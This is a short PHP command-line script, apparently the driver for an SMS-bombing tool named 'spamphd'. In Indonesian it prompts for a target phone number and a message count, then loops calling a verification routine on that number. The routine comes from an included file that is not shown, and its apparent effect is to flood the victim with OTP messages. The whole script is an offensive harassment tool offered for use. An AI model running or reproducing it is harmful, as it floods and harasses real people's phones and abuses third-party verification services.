<?php
include '010.php';

/*
    https://github.com/mry2/spamphd
*/

$init = new Bom();

echo "Silahkan isi (tanpa 0/62)\nMasukan Nomer Target ==> ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
